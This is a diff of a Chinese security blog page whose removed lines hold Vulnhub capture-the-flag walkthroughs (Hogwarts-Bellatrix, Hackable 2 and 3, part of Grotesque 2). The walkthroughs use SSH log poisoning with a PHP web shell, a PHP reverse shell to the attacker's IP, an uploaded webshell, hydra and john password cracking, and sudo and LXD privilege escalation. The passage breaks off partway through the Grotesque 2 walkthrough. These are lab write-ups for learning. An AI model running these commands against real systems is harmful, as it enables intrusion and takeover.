-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现提示存在文件包含：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.127 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/4.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
-<p>1.在主页其实是提示了有ikilledsiriusblack.php这个文件，后面跟file参数存在文件包含漏洞：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/7.png" alt="image-"></p>
-<p>2.利用文件包含漏洞，写入payload，获得shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log，可以查看SSH日志信息</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&#x27;@192.168.56.127，稍微污染SSH日志信息</span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=id，可以使用cmd命令</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/9.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=php+-r+&#x27;$sock%3dfsockopen(&quot;192.168.56.102&quot;,1234)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;，写入命令反弹shell</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="密码爆破初步提权">密码爆破，初步提权</span></h3><blockquote>
-<p>1.我们可以在当前目录下发现一个被类似base编码了的目录，目录下有一个隐藏的字典文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd c2VjcmV0cw==</span><br><span class="line">ls -la</span><br><span class="line">cat .secret.dic</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/12.png" alt="image-"></p>
-<p>2.而Swordofgryffindor内是lestrange用户与其密码hash：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Swordofgryffindor</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/13.png" alt="image-"></p>
-<p>3.将密码字典复制与密码hash到kali本地，利用john进行爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim dic.txt</span><br><span class="line">vim hash.txt</span><br><span class="line">john --wordlist=dic.txt hash.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/14.png" alt="image-"></p>
-<p>4.可以登录到lestrange用户：</p>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.利用sudo -l命令，查找可用文件，发现vim可以提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/16.png" alt="image-"></p>
-<p>2.直接写入，提权到root：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/17.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/18.png" alt="image-"></p>
 </blockquote>
 
 
@@ -715,377 +1116,6 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Hacksudo/" rel="tag">Hacksudo</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Hackable-3/">
-                Hackable 3
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hackable-iii">Hackable III</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hackable-iii">名称：Hackable III</span></h4><h4><span id="发布日期202162">发布日期：2021.6.2</span></h4><h4><span id="作者elias-sousa">作者：Elias Sousa</span></h4><h4><span id="系列hackable">系列：Hackable</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;mnt&#x2F;root&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hackable3ova">文件名：hackable3.ova</span></h4><h4><span id="文件大小16gb">文件大小：1.6GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomhackablehackable3ova">下载地址：</span></h4><h4><span id="md5-11855876a01867e9b79d6d5536f89dc0">MD5: 11855876A01867E9B79D6D5536F89DC0</span></h4><h4><span id="sha1-f5f200b85774430e0437f786de11d20a5a022d33">SHA1: F5F200B85774430E0437F786DE11D20A5A022D33</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Hackable III和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Hackable-3/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，可以发现只开放了80端口，其中有一个http-robots.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.103，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/4.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现一些目录，但是没有太多的可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.103，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/5.png" alt="image-"></p>
-</blockquote>
-<h3><span id="访问主页信息提取解密">访问主页，信息提取解密</span></h3><blockquote>
-<p>1.对靶机主页进行访问，查看源码发现提示：</p>
-<p><img src="/2022/06/13/Hackable-3/6.png" alt="image-"></p>
-<p>2.提示告知我们可能要用到端口knocking及图片隐写的技术，并且获得了jubiscleudo这个用户名，结合提示上方的login页，可以尝试使用sql注入，但发现其实直接登录也会跳转，虽然是空白页，但是可以查看源码：</p>
-<p><img src="/2022/06/13/Hackable-3/7.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/8.png" alt="image-"></p>
-<p>3.我们在源码里发现了一个图片指示，结合之前的提示涉及图片隐写，可以把图片获取下来，用steghide分离一下隐藏内容：</p>
-<p><img src="/2022/06/13/Hackable-3/9.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 3.jpg，分离出文本</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/10.png" alt="image-"></p>
-<p>4.这样我们的得到了第一个端口号，我们返回主页，去&#x2F;config目录下查看，只有一个1.txt，里面是base64编码的10000，如此我们得到第二个端口：</p>
-<p><img src="/2022/06/13/Hackable-3/11.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/12.png" alt="image-"></p>
-<p>5.同样，我们去&#x2F;css目录下查看，发现有2.txt，是brainfuck编码的4444，这就是第三个端口号：</p>
-<p><img src="/2022/06/13/Hackable-3/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/14.png" alt="image-"></p>
-<p>6.而&#x2F;backup目录下有一个wordlist.txt，很像密码字典，我们把这个字典获取，等下可以进行爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.103/backup/wordlist.txt，获取密码字典</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录">SSH登录</span></h3><blockquote>
-<p>1.利用三个端口号进行knocking，可以发现ssh已经开放：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.56.103 10000 4444 65535，knock</span><br><span class="line">nmap -p22 192.168.56.103，查看22端口状态</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/16.png" alt="image-"></p>
-<p>2.利用wordlist.txt密码字典对jubiscleudo用户使用hydra进行爆破，登录ssh：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 192.168.56.103 ssh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/17.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jubiscleudo@192.168.56.103，ssh登录</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="二进制提权">二进制提权</span></h3><blockquote>
-<p>1.利用jubiscleudo帐户，我们能查看&#x2F;var&#x2F;www&#x2F;html目录下.backup_config.php文件，可以发现用户hackable_3及其密码：</p>
-<p><img src="/2022/06/13/Hackable-3/19.png" alt="image-"></p>
-<p>2.登录hackable_3，查看组，发现二进制文件lxc和lxd可用：</p>
-<p><img src="/2022/06/13/Hackable-3/20.png" alt="image-"></p>
-<p>3.我们可以利用alpine进行提权，系列命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Kali：</span><br><span class="line">把准备好的alpine压缩包传上靶机，命令如下：</span><br><span class="line">scp /tmp/alpine-minirootfs-3.14.1-x86_64.tar.gz hackable_3@192.168.56.103:/tmp/</span><br><span class="line"></span><br><span class="line">hackable_3:</span><br><span class="line">cd /tmp</span><br><span class="line">lxc image import ./ alpine-minirootfs-3.14.1-x86_64.tar.gz –alias fasto</span><br><span class="line">lxc image list</span><br><span class="line">lxd init</span><br><span class="line">lxc init fasto groot -c security.privileged=true</span><br><span class="line">lxc config device add groot mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line"></span><br><span class="line">lxc start groot</span><br><span class="line">lxc exec groot /bin/sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/21.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/22.png" alt="image-"></p>
-<p>4.在&#x2F;mnt&#x2F;root&#x2F;root目录下，可以发现root.txt，即flag：</p>
-<p><img src="/2022/06/13/Hackable-3/23.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Hackable-2/">
-                Hackable 2
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hackable-ii">Hackable II</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hackable-ii">名称：Hackable II</span></h4><h4><span id="发布日期2021615">发布日期：2021.6.15</span></h4><h4><span id="作者elias-sousa">作者：Elias Sousa</span></h4><h4><span id="系列hackable">系列：Hackable</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>shrek:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hackableiiova">文件名：hackableII.ova</span></h4><h4><span id="文件大小14gb">文件大小：1.4GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomhackablehackableiiova">下载地址：</span></h4><h4><span id="md5-ee4f408ba953e626e3852cfec7acefa3">MD5: EE4F408BA953E626E3852CFEC7ACEFA3</span></h4><h4><span id="sha1-89b1fdf9fcdcc5d2fbb736318ccc77e9f25d1c06">SHA1: 89B1FDF9FCDCC5D2FBB736318CCC77E9F25D1C06</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Hackable II和攻击机kali2021在VirtualBox下设置为仅主机模式（Vmware可能会无法获取网络），使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Hackable-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，可以发现开放了21，22，80端口，其中21端口可以使用anonymous身份进行登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.101，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/4.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;files目录下有一个CALL.html，但是没有太多的可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.101，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/5.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="登录ftp上传webshell">登录Ftp，上传webshell</span></h3><blockquote>
-<p>1.使用anonymous直接登录ftp，发现当前目录可写：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp open 192.168.56.101</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/7.png" alt="image-"></p>
-<p>2.则可上传webshell，这里利用kali自带的webshell简单修改后上传：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php，修改ip为kali的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put php-reverse-shell.php，ftp上传webshell，要在/usr/share/webshells/php/目录下</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/9.png" alt="image-"></p>
-<p>3.kali开启监听，从靶机&#x2F;files目录下访问webshell，得到shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001，利用刚才设定的端口</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="目录搜索进行提权">目录搜索，进行提权</span></h3><blockquote>
-<p>1.可以对&#x2F;home目录进行一下搜寻，发现important.txt的文件，提示我们去运行.runme.sh，并得到用户名和md5后的密码：</p>
-<p><img src="/2022/06/13/Hackable-2/12.png" alt="image-"></p>
-<p>2.通过对密码的md5破解，其实就可以登录shrek，ssh登录后，可以查看shrek &#x2F;home目录下的文件user.txt：</p>
-<p><img src="/2022/06/13/Hackable-2/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/14.png" alt="image-"></p>
-<p>3.再来看看能从什么地方进行提权，发现可以直接使用python：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/15.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3.5 -c &#x27;import os;os.system(&quot;/bin/sh&quot;)&#x27;，直接提权</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/16.png" alt="image-"></p>
-<p>4.最后在&#x2F;root目录下，发现root.txt，即flag：<br><img src="/2022/06/13/Hackable-2/17.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Grotesque-2/">
-                Grotesque 2
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="grotesque2">Grotesque:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称grotesque2">名称：Grotesque:2</span></h4><h4><span id="发布日期2021330">发布日期：2021.3.30</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列grotesque">系列：Grotesque</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>angel:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名grotesque2_vhova">文件名：grotesque2_vh.ova</span></h4><h4><span id="文件大小824mb">文件大小：824MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagegrotesquegrotesque2_vhova">下载地址：</span></h4><h4><span id="md5-57a2630c846d285b1390789d2d5b1c3d">MD5: 57A2630C846D285B1390789D2D5B1C3D</span></h4><h4><span id="sha1-b6fa719aca753e479dc5d3425b0c7a4435019c59">SHA1: B6FA719ACA753E479DC5D3425B0C7A4435019C59</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机grotesque2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Grotesque-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了很多端口，看来是做迷惑，访问主页，源码只有js内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.109 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/4.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现也是很多目录且无法对应端口，没办法，把全部的index页获取下来，按大小排序，找寻线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.109/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt –wildcard switch，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/6.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;23..600&#125;; do wget 192.168.56.109:$i -O index$i; done，获取各端口index</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/7.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la | sort，排序文件，最大是index258</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/8.png" alt="image-"></p>
-</blockquote>
-<h3><span id="发现目标页">发现目标页</span></h3><blockquote>
-<p>1.访问一下大小最大的页面192.168.56.108:258，页面提示我们ssh用户名，我们查看页面源码，发现ok的emoji其实是一张图片：</p>
-<p><img src="/2022/06/13/Grotesque-2/9.png" alt="image-"></p>
-<p>2.将emoji的图片下载，放大后得到一串类似md5的字串，直接md5无法解出，但是页面有提示我们-100，得到ssh密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.109:258/emoji/hand.png</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/11.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录">SSH登录</span></h3><blockquote>
-<p>1.通过刚才的ssh用户名提示，我们可以试出是用户angel的密码，也可以使用hydra进行爆破，将ssh用户统一写入use.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L use.txt -p solomon1 ssh://192.168.56.109</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/14.png" alt="image-"></p>
-<p>2.登录后在目录下发现第一个flag，user.txt：</p>
-<p><img src="/2022/06/13/Grotesque-2/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="pspy64s-监控进程获取flag">pspy64s 监控进程，获取flag</span></h3><blockquote>
-<p>1.进入quiet文件夹，发现大量数字命名文件，用pspy64s进行进程监控，发现有定时任务的读写检查：</p>
